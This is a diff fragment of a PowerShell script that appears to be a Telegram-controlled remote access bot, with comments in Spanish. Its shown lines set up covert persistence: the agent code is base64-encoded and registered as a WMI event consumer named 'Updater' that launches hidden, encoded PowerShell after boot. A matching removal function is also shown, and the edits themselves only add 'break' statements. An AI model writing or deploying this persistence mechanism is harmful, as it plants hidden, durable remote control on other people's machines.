@@ -180,7 +180,7 @@ If (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdenti
 $agent_bot = create_agent
 $code =[system.convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($agent_bot))
 Set-WmiInstance -Class __EventFilter -Namespace "root\subscription" -Arguments @{name='Updater';EventNameSpace='root\CimV2';QueryLanguage="WQL";Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325"};$Consumer=Set-WmiInstance -Namespace "root\subscription" -Class 'CommandLineEventConsumer' -Arguments @{ name='Updater';CommandLineTemplate="$($Env:SystemRoot)\System32\WindowsPowerShell\v1.0\powershell.exe -win hidden -enc $code";RunInteractively='false'};Set-WmiInstance -Namespace "root\subscription" -Class __FilterToConsumerBinding -Arguments @{Filter=$Filter;Consumer=$Consumer} | Out-Null
-$texto = write-host "Persistencia ejecutada correctamente"; return $texto}
+$texto = write-host "Persistencia ejecutada correctamente"; return $texto;break}
 }
 
 function remove-persistence {
@@ -188,9 +188,9 @@ If (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdenti
 {$texto = write-host "Sorry, necesitas privilegios";return $texto; break }  
 else {
 $comando = (Get-WmiObject commandlineeventconsumer -Namespace root\subscription -Filter "name='UPDATER'").CommandLineTemplate
-if ($comando -eq $null -or $comando -eq "") {$texto = Write-Host "Todo correcto! parece estar limpio el arranque"; return $texto} else {
+if ($comando -eq $null -or $comando -eq "") {$texto = Write-Host "Todo correcto! parece estar limpio el arranque"; return $texto; break} else {
 $texto = Write-Host "Eliminando persistencia"
-Get-WmiObject commandlineeventconsumer -Namespace root\subscription -Filter "name='Updater'" | Remove-WmiObject; return $texto
+Get-WmiObject commandlineeventconsumer -Namespace root\subscription -Filter "name='Updater'" | Remove-WmiObject; return $texto; break
 }}}
 
 function test-command {param ($comando="",$botkey="",$chat_id="",$first_connect="") 
